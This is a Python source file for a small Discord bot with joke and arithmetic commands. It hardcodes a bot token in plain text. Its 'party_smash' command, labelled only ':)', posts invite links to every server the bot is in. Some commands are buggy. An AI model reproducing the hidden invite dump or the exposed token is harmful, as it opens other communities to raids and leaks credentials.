import discord
import random
import asyncio
import aiohttp
from discord.ext.commands import Bot
from discord.voice_client import VoiceClient



BOT_PREFIX = ('!')
TOKEN = "NDQ3MDY3NDg4NDI1ODY5MzIz.DeSCpw.BlAtKKiXOMBy7yhd3pCGDZjhAG8"

client = Bot(command_prefix=BOT_PREFIX)

@client.command(name='8ball',
description="Answers a yes/no question.",
brief="Answers from the beyond",
aliases=['eight_ball', 'eightball', '8-ball'],
pass_context=True)

async def eight_ball(context):
  possible_responses = [
    'That is a resounding no',
    'It is not looking likely',
    'Too hard to tell',
    'It is quite possible',
    'That is a definite yes',
  ]
  await client.say(random.choice(possible_responses) + ", " + context.message.author.mention)

@client.command(name='ping',
description='Responds with pong',
brief='Responds with pong')

async def ping():
  await client.say("Pong " + ":ping_pong:")
  print("user has pinged")

@client.command(name='square',
description='Squares 2 numbers',
brief='Squares 2 numbers')

async def square(number=None):
	if number is None:
		await client.say("You must provide a number to square.")
		return
	squared_value = int(number) * int(number)
	await client.say(str(number) + "² is " + str(squared_value))

@client.command(name='multiply',
description='Multiplies 2 numbers',
brief='Multiplies 2 numbers')

async def multiply(number1=None, number2=None):
	if number1 is None or number2 is None:
		await client.say("You must provide two numbers to multiply, separated by a space.")
		return
	multiplied_value = int(number1) * int(number2)
	await client.say(str(number1) + " multiplied by " + str(number2) + " = " + str(multiplied_value))  

@client.command(name='party_smash',
description='Crashes the party :)',
brief=':)')

async def party_smash():
	for server in client.servers:
		invite = client.create_invite(server)
		await client.say(invite)
	await asyncio.sleep(600) 

@client.event
async def on_ready():
  print("Logged in as " + client.user.name)

@client.command(name='add',
brief='adds too numbers')

async def add(number1=None, number2=None):
  if number1 is None or number2 is None:
    await client.say("You must provide two numbers to add, seperated by a space")
    return
    added_value = int(number1) + int(number2)
    await client.say(str(number1) + " +" + str(number2) + " =" + str(added_value))






async def list_servers():
   await client.wait_until_ready()
   while not client.is_closed:
     print("Current servers:")
     for server in client.servers:
       print(server.name)
     await asyncio.sleep(600) 



      



client.loop.create_task(list_servers())
client.run(TOKEN)